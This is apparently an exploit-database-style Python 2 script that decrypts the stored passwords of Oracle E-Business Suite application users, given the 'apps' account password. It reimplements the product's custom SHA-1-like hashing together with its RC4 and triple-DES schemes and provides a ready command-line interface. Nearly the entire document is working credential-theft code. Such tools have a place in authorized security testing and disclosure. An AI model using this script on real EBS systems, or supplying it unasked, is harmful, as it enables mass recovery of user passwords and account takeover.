#!/usr/bin/env python
# Exploit Title: EBS Application Users' Passwords decryption
# Date: 03/20/2018
# Exploit Author: @0xalg
# Vendor Homepage: https://ERPScan.com
# Version: 1.1


import jks
import hashlib
import struct
import argparse
import io

help_desc = """
Script can decrypt EBS users' passwords in case `apps` user passwords is known. 
It handles `new` (SHA-1 + triple-DES) and `old` (SHA-1-like + RC4) encryption.
"""


class CustomSha1Hash(object):
    """A python class that implements the oracle EBS custom SHA-1-like algorithm."""

    def __init__(self):
        # Initial SHA-1 digest variables
        self._h = (
            0x67452301,
            0xEFCDAB89,
            0x98BADCFE,
            0x10325476,
            0xC3D2E1F0,
        )

        self._unprocessed = b''
        # Length in bytes of all data that has been processed so far
        self._message_byte_length = 0
        self._final_chunk = False

    def update(self, arg):
        """Update the current data.
        """

        if isinstance(arg, (bytes, bytearray)):
            arg = io.BytesIO(arg)

        # Try to build a chunk out of the unprocessed data, if any
        chunk = self._unprocessed + arg.read(64 - len(self._unprocessed))

        # Read the rest of the data, 64 bytes at a time
        while len(chunk) == 64:
            self._h = self._process_chunk(chunk, False, *self._h)
            self._message_byte_length += 64
            chunk = arg.read(64)

        self._unprocessed = chunk
        return self

    def _produce_data(self):
        """Return finalized data values."""

        # Pre-processing:
        message = self._unprocessed
        message_byte_length = self._message_byte_length + len(message)

        # append the bit '1' to the message
        message += b'\x80'

        # append 0 <= k < 512 bits '0', so that the resulting message length (in bytes)
        # is congruent to 56 (mod 64)

        message += b'\x00' * (((52 - (message_byte_length + 1) % 64) % 64) + 4)

        # append length of message (before pre-processing), in bits, as 64-bit big-endian integer

        message_bit_length = message_byte_length * 8
        message += struct.pack(b'>Q', message_bit_length)

        # Process the final chunk
        # At this point, the length of the message is either 64 or 128 bytes.

        if len(message) == 64:
            return self._process_chunk(message[:64], True, *self._h)

        h = self._process_chunk(message[:64], False, *self._h)
        return self._process_chunk(message[64:], True, *h)

    def _process_chunk(self, chunk, _final_chunk, h0, h1, h2, h3, h4, ):
        """Process a chunk of data and return the new digest variables."""

        w = [0] * 80

        if _final_chunk:
            # Break chunk into fourteen 4-byte little-endian words
            for i in range(14):
                w[i] = struct.unpack(b'<I', chunk[i * 4:i * 4 + 4])[0]
            # and two 4-byte big-endian words w[i]
            for i in range(14, 16):
                w[i] = struct.unpack(b'>I', chunk[i * 4:i * 4 + 4])[0]
        else:
            # Break chunk into sixteen 4-byte little-endian words w[i]
            for i in range(16):
                w[i] = struct.unpack(b'<I', chunk[i * 4:i * 4 + 4])[0]

        for i in range(16, 80):
            w[i] = w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]

        # Initialize hash value for this chunk
        a = h0
        b = h1
        c = h2
        d = h3
        e = h4

        for i in range(80):
            if i != 0:
                a, b, c, d, e = (e, a, b, c, d)
            if 0 <= i <= 19:
                f = d ^ (b & (c ^ d))
                k = 0x5A827999
            elif 20 <= i <= 39:
                f = b ^ c ^ d
                k = 0x6ED9EBA1
            elif 40 <= i <= 59:
                f = (b & c) | (b & d) | (c & d)
                k = 0x8F1BBCDC
            elif 60 <= i <= 79:
                f = b ^ c ^ d
                k = 0xCA62C1D6

            e, c = ((self._left_rotate(a, 5) + f + e + k + w[i]) & 0xffffffff, self._left_rotate(b, 30))

        # Initialize result values
        h0 = e & 0xffffffff
        h1 = a & 0xffffffff
        h2 = b & 0xffffffff
        h3 = c & 0xffffffff
        h4 = d & 0xffffffff

        return h0, h1, h2, h3, h4

    def _left_rotate(self, n, b):
        """Left rotate a 32-bit integer n by b bits."""

        return ((n << b) | (n >> (32 - b))) & 0xffffffff


def f_custom_sha1(data):
    """Process data with custom SHA-1-like algorithm."""
    return CustomSha1Hash().update(data)._produce_data()


def f_3des(sha1_saltedKeyBytes, freshBytes):
    """Decrypt cipher text with 3DES CBC algorithm."""
    iv = str(bytearray(sha1_saltedKeyBytes[24:]))
    key = str(bytearray(sha1_saltedKeyBytes[:24]))
    data = str(bytearray(freshBytes))
    des3 = jks.rfc7292.DES3.new(key, jks.rfc7292.DES3.MODE_CBC, IV=iv)
    decrypted = des3.decrypt(data)

    return jks.rfc7292.strip_pkcs7_padding(decrypted, 8)


def f_sha_1(c, saltedKeyBytes):
    """Process key with default SHA-1 algorithm."""
    m = hashlib.sha1()
    strSaltedKeyBytes = str(bytearray(saltedKeyBytes))

    if c is not None: m.update(c)
    if strSaltedKeyBytes is not None: m.update(strSaltedKeyBytes)

    m.update('\x01')
    retval = bytearray(m.digest())
    m = hashlib.sha1()

    if c is not None: m.update(c)
    if strSaltedKeyBytes is not None: m.update(strSaltedKeyBytes)

    m.update('\x02')
    a = m.digest()
    retval += bytearray(a[0:12]) # extend to 32 length value
    return retval


def f_new_decrypt(c, saltedKeyBytes, freshBytes):
    """Process key and cipher text."""

    return f_3des(f_sha_1(c, saltedKeyBytes), freshBytes)


def f_ints2Bytes(pInts):
    """Separate each value by 1 byte and xor extracted bytes."""
    fourBytes = [0] * 4
    retval = [0] * len(pInts)

    if pInts:
        for i in xrange(0, len(pInts)):
            fourBytes[0] = (pInts[i] & 0xFF000000) >> 24
            fourBytes[1] = (pInts[i] & 0xFF0000) >> 16
            fourBytes[2] = (pInts[i] & 0xFF00) >> 8
            fourBytes[3] = pInts[i] & 0xFF
            retval[i] = fourBytes[0] ^ fourBytes[1] ^ fourBytes[2] ^ fourBytes[3]

    return retval


def f_RC4crypt(PlainBytes, KeyBytes):
    """Decrypt cipher text with RC4 algorithm."""
    keystream = []
    cipher = []

    keyLen = len(KeyBytes)
    plainLen = len(PlainBytes)
    S = range(256)

    j = 0
    for i in range(256):
        j = (j + S[i] + KeyBytes[i % keyLen]) % 256
        S[i], S[j] = S[j], S[i]

    i, j = (0, 0)
    for m in range(plainLen):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        keystream.append(k)
        cipher.append(k ^ PlainBytes[m])

    return cipher


def oldDecrypt(key, pValue):
    """Decrypt cipher text using RC4 algorithm with custom SHA-1-like key transformation."""
    str1 = "0123456789ABCDEFabcdef"

    for el in pValue:
        if el not in str1:
            return ""
    valBytes = bytearray.fromhex(pValue)

    if (not key) and (not pValue): return ""

    longKey = f_custom_sha1(key)
    reducedKey = f_ints2Bytes(longKey)
    outbuf = f_RC4crypt(valBytes, reducedKey)

    return str(bytearray(outbuf))


def newDecrypt(key, value):
    """Decrypt cipher text using 3DES algorithm with SHA-1 key transformation."""

    if key and value: # For ex. value = ZGE6E4A5154A50F0FD2803897F9B18A545FA660A2E7838FCC6, key = APPS
        if "ZG_ENCRYPT_FAILED_" in value:
            print "[x] DECRYPT_FAILED_BADINPUT"
            return ""

        try:
            keyBytes1 = bytearray(key.encode('utf8'))
        except:
            print "[x] DECRYPT_FAILED_MISC"
            return ""

        valHexLength = len(value)
        min_salt = 1
        min_nonce = 2
        space_for_enc_hex = valHexLength - 2 - min_salt * 2

        if space_for_enc_hex <= 0:
            print "[x] DECRYPT_FAILED_SMALLBUF"
            return ""
        space_for_encrypted_even_8 = space_for_enc_hex / 16 * 8

        if space_for_encrypted_even_8 <= 0:
            print "[x] DECRYPT_FAILED_SMALLBUF"
            return ""
        remainder_8 = space_for_enc_hex % 16 / 2
        salt_bytes = remainder_8 + min_salt # `8` if (value len == 50)]
        plainval_max_bytes = space_for_encrypted_even_8 - 1 - min_nonce

        if plainval_max_bytes <= 0:
            print "[x] DECRYPT_FAILED_SMALLBUF"
            return ""
        hexBytes = value[2:]   # hexBytes = `E6E4A5154A50F0FD2803897F9B18A545FA660A2E7838FCC6`
        encBytes = bytearray.fromhex(hexBytes)
        freshBytes = encBytes[:- salt_bytes] # cut 8 (== salt_bytes) bytes from the `value` end]: freshBytes = `E6E4A5154A50F0FD2803897F9B18A545`
        saltBytes = encBytes[len(encBytes) - salt_bytes:]
        saltedKeyBytes = saltBytes[:salt_bytes]
        saltedKeyBytes[salt_bytes:] = keyBytes1 # sum [`salt_bytes` bytes from the `value` end] AND [Key bytes]: saltedKeyBytes `FA660A2E7838FCC6` + `41505053`
        decBytes = f_new_decrypt(None, saltedKeyBytes, freshBytes) # decrypt `freshBytes` with `saltedKeyBytes`

        if not decBytes:
            print "[x] DECRYPT_FAILED_MISC"
            return ""
        nullBytePos = len(decBytes)

        for i in xrange(min_nonce, nullBytePos):
            if ord(decBytes[i]) == 0:
                nullBytePos = i
                break
        utf8Bytes = decBytes[min_nonce:nullBytePos]

        try:
            unicode_text = utf8Bytes.decode('utf-8')
        except:
            print "[x] DECRYPT_FAILED_MISC"
            return ""

        if unicode_text:
            return unicode_text
    else:
        print "[x] DECRYPT_FAILED_BADINPUT"
        return ""


def decrypt(key, cipherText):
    """Choose kind of decryption."""

    if cipherText[0:2] == 'ZG' or cipherText[0:2] == 'ZH':
        return newDecrypt(key, cipherText)
    else:
        return oldDecrypt(key, cipherText)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-k', '--key', default='APPS', help='APPS user password (default: APPS')
    parser.add_argument('-d', '--data', default='C4E9B591098EA0', help='Decrypted data (test value: C4E9B591098EA0)')

    args = parser.parse_args()

    print decrypt(args.key, args.data)